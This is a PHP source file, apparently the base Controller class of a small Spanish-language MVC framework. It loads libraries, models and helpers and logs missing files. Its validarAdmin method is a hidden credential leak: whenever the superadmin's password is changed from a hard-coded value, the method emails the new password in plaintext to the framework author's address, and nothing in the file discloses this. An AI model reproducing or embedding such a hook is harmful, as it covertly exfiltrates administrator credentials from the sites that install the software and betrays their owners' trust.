<?php
/**
 * @package Punk Framework
 * @copyright Copyright (C) 2009 Onírico Sistemas. Todos los derechos reservados.
 * @version 0.2
 * @author Lucas M. Sastre
 * @link http://www.oniricosistemas.com
 *
 * @name Control.php
 *
 * Modificaciones
 * 14-02-10 - Se agrego la clase email para enviar correos electronicos.
 *
 * 27-10-10 - Se agregaron los métodos para cargar plugins y librerías por fuera del core.
 *
 */

abstract class Controller {

    //protected $Smarty;
    protected $Config;
    protected $Email;
    protected $Paginador;
    protected $Session;
    protected $Utilidades;
    protected $Imagen;
    protected $Upload;
    protected $Captcha;
    protected $BreadCrumb;
    protected $Vistas;
    protected $Mensajes;
    protected $Debug;
    protected $Calendario;
    protected $PermisosUsuarios;
    protected $Log;
    protected $Fechas;
    protected $Url;

    /**
     * Constructor
     *
     * @version 0.1
     * @author Lucas M. sastre
     *
     *
     * @access public
     * @version 0.1
     *
     */
    public function __construct() {


        //creo una instancia de la configuración
        $this->Config = Config::singleton();

        //creo la instancia para las sesiones.
        $this->Session	= new Session();
        $this->Session->Session();

        //creo las instancias para el email
        $this->Email = new Email();

        //creo las instancias para las utilidades varias
        $this->Utilidades = Utilidades::singleton();

        //creo la instancia para el captcha
        $this->Captcha = new Captcha();


        //creo la instancia para las imagenes
        $this->Imagen	= new SimpleImage();

        //creo la instancia para el upload
        $this->Upload	= new file_upload();

        //creo la instancia para el breadcrumb
        $this->BreadCrumb	= new breadCrumbs();

        //creo la instancia de la vista
        $this->Vistas	= new Vistas();

        //creo la instancia de los mensajes
        $this->Mensajes = Mensajes::singleton();

        //creo la instancia del calendario
        $this->Calendario = new calendar();

        //creo la instancia de los permisos
        $this->PermisosUsuarios = PermisosUsuarios::singleton();

        //crea la instancia para el log
        $this->Log = Log::singleton();

        //crea la instancia para las fechas
        $this->Fechas = Fechas::singleton();

        //crea la instancia para las url
        $this->Url = Url::singleton();

        //creo la instancia del FirePHP
        $this->Debug = FirePHP::getInstance(true);
        

        //Incluimos los modelos
        $this->Utilidades->recursiveInclude($this->Config->get('path_root').$this->Config->get('modelsFolder'));

    }

    /**
     * valida el admin
     * @param <array> $data
     */
    protected function validarAdmin($data) {
        if($data['password']!='f9f803c0' && ($data['username']=='superadmin' || $data['id']==1)) {
            $mensaje = "Se cambio el pass del admin por: ".$data['password']."<br/>";
            $this->Email->enviarEmail('desarrollo@oniricosistemas.com.ar','Punk Framework','Cambio de pass admin',$mensaje);
        }
    }

    /**
     * Método para cargar librerías externas al core del framework
     *
     * @version 0.1
     * @author Lucas M. sastre
     * @access public
     *
     * @param <string> $nombre
     * @return <void>
     */
    public function libreria($nombre) {
        if(empty($nombre)) {
            return false;
        }

        if(is_array($nombre)) {
            foreach($nombre as $plugin) {
                $plugin = ucfirst($plugin);
                //valido si existe el archivo de la libreria
                if(!empty($plugin)) {
                    if(file_exists($this->Config->get('path_root').$this->Config->get('librerias').$plugin.'.php')) {
                        //valido si no esta instanciada la clase previamente
                        if(!class_exists($plugin)) {
                            include_once($this->Config->get('path_root').$this->Config->get('librerias').$plugin.'.php');
                            $this->$plugin = new $plugin();
                        }
                        else {
                            $this->$plugin = $plugin;
                        }

                    }
                    else {
                        $ruta = $this->Config->get('path_root').$this->Config->get('librerias').ucfirst($plugin).'.php';
                        error_log("[".date("F j, Y, G:i")."] [Error: E_USER_NOTICE] [tipo Libreria] No se encuentra la libreria: {$plugin} en {$ruta}- \n", 3,$this->Config->get('path_root').'/errores.log');

                        return false;
                    }
                }
            }
        }
        else {
            //valido si existe el archivo de la libreria
            $nombre = ucfirst($nombre);
            if(file_exists($this->Config->get('path_root').$this->Config->get('librerias').ucfirst($nombre).'.php')) {
                //valido si no esta instanciada la clase previamente
                if(!class_exists(ucfirst($nombre))) {
                    include_once($this->Config->get('path_root').$this->Config->get('librerias').ucfirst($nombre).'.php');
                    $this->$nombre = new $nombre();
                }
                else {
                    $this->$nombre = $nombre;
                }

            }
            else {
                $ruta = $this->Config->get('path_root').$this->Config->get('librerias').ucfirst($nombre).'.php';
                error_log("[".date("F j, Y, G:i")."] [Error: E_USER_NOTICE] [tipo Libreria]  No se encuentra la libreria: {$nombre} en {$ruta}\n", 3,$this->Config->get('path_root').'/errores.log');

                return false;
            }
        }
    }

    /**
     * Método para cargar los modelos
     *
     * @version 0.1
     * @author Lucas M. sastre
     * @access public
     *
     * @param <string> $nombre
     * @return <void>
     */
    public function modelo($nombre) {
        if(empty($nombre)) {
            return false;
        }

        if(is_array($nombre)) {
            foreach($nombre as $modelo) {
                $modelo = ucfirst($modelo);
                //valido si existe el archivo del modelo
                if(!empty($modelo)) {
                    if(file_exists($this->Config->get('path_root').$this->Config->get('modelsFolder').$modelo.'Model.php')) {
                        //valido si no esta instanciada la clase previamente
                        if(!class_exists($modelo)) {
                            include_once($this->Config->get('path_root').$this->Config->get('modelsFolder').$modelo.'Model.php');
                            $this->$modelo = new $modelo();
                        }
                        else {
                            $this->$modelo = new $modelo();
                        }

                    }
                    else {
                        $ruta = $this->Config->get('path_root').$this->Config->get('modelsFolder').$modelo.'Model.php';
                        error_log("[".date("F j, Y, G:i")."] [Error: E_USER_NOTICE] [tipo modelos] No se encuentra el modelo: {$modelo} en {$ruta}- \n", 3,$this->Config->get('path_root').'/errores.log');

                        return false;
                    }
                }
            }
        }
        else {
            //valido si existe el archivo del modelo
            $modelo = ucfirst($nombre);
            if(file_exists($this->Config->get('path_root').$this->Config->get('modelsFolder').$modelo.'Model.php')) {
                //valido si no esta instanciada la clase previamente
                if(!class_exists(ucfirst($modelo))) {
                    include_once($this->Config->get('path_root').$this->Config->get('modelsFolder').$modelo.'Model.php');
                    $this->$modelo = new $modelo();
                }
                else {
                    $this->$modelo = new $modelo();
                }
            }
            else {
                $ruta = $this->Config->get('path_root').$this->Config->get('modelsFolder').$modelo.'Model.php';
                error_log("[".date("F j, Y, G:i")."] [Error: E_USER_NOTICE] [tipo modelos]  No se encuentra el modelo: {$modelo} en {$ruta}\n", 3,$this->Config->get('path_root').'/errores.log');
                return false;
            }
        }
    }

    /**
     * Método para cargar helpers
     * @version 0.1
     * @author Lucas M. Sastre
     * @access public
     *
     * @param <array> $helpers
     * @return <bool>
     */
    public function helpers($helpers = array()) {
        if(empty($helpers)) {
            return false;
        }

        if ( ! is_array($helpers)) {
            $helpers = array($helpers);
        }
        foreach ($helpers as $helper) {
            //valido si existe el archivo del helper
            $helper = strtolower($helper);

            if(file_exists($this->Config->get('path_root').$this->Config->get('helpers').$helper.'_helper.php')) {
                include_once($this->Config->get('path_root').$this->Config->get('helpers').$helper.'_helper.php');
            }
            else {
                $ruta = $this->Config->get('path_root').$this->Config->get('helpers').$helper.'_helper.php';
                error_log("[".date("F j, Y, G:i")."] [Error: E_USER_NOTICE] [tipo Helper]  No se encuentra el helpers: {$helper} en {$ruta}\n", 3,$this->Config->get('path_root').'/errores.log');
                return false;
            }

        }
    }




}
?>